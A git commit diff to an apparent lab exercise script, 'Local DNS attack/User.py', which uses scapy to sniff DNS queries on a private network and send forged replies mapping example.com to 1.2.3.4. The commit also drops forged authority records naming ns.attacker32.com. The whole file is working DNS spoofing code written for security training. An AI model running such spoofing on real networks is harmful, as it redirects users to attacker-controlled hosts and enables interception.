dc812e9d1fcf3354a9f2d4223c0e752eca498b13
jahnavi24shah <jahnavishah08@gmail.com>
2022-12-12 08:57:59 -0500

    Local DNS attack

--- Local DNS attack/User.py
+++ Local DNS attack/User.py
@@ -4,31 +4,19 @@ from scapy.all import *
 def spoof_dns(packet):
   if (DNS in packet and 'example.com' in packet[DNS].qd.qname.decode('utf-8')):
 
-    # Swapping the src and dest IP address
     IPpacket = IP(dst=packet[IP].src, src=packet[IP].dst)
-
-    # Swapping the port number
     UDPpacket = UDP(dport=packet[UDP].sport, sport=53)
 
-    # The Answer Section { contians RR that answer the question }
     Answer_section = DNSRR(RRname=packet[DNS].qd.qname, type='A',
                  ttl=259200, rdata='1.2.3.4')
 
-    # The Authority Section {contains RRs that point toward an authoritative name server}
-    AuthSec1 = DNSRR(RRname='example.com', type='NS',
-                   ttl=259200, rdata='ns.attacker32.com')
-    AuthSec2 = DNSRR(RRname='example.com', type='NS',
-                   ttl=259200, rdata='ns.example.com')
-
-    # Construct the DNS packet
     DNSpacket = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1,  
                  qdcount=1, ancount=1, nscount=2, arcount=3,
-                 an=Answer_section, ns=AuthSec1/AuthSec2)
+                 an=Answer_section)
 
-    # Construct the entire IP packet and send it out
     Spoofpacket = IPpacket/UDPpacket/DNSpacket
     send(Spoofpacket)
 
 # Sniff UDP query packets and invoke spoof_dns().
-f = 'udp and src host 10.9.0.53 and dst port 53'
+f = 'udp and src host 10.9.0.5 and dst port 53'
 packet = sniff(iface='br-038b28aef07b', filter=f, prn=spoof_dns)    
